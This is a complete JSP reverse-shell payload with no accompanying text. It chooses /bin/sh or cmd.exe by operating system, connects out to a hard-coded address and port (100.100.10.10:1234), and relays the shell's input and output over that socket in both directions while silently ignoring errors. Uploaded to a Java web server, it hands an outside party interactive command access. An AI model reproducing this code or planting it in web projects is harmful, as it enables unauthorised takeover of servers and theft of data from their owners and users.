<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream zi;
    OutputStream nw;

    StreamConnector( InputStream zi, OutputStream nw )
    {
      this.zi = zi;
      this.nw = nw;
    }

    public void run()
    {
      BufferedReader pi  = null;
      BufferedWriter fjp = null;
      try
      {
        pi  = new BufferedReader( new InputStreamReader( this.zi ) );
        fjp = new BufferedWriter( new OutputStreamWriter( this.nw ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = pi.read( buffer, 0, buffer.length ) ) > 0 )
        {
          fjp.write( buffer, 0, length );
          fjp.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( pi != null )
          pi.close();
        if( fjp != null )
          fjp.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "100.100.10.10", 1234 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
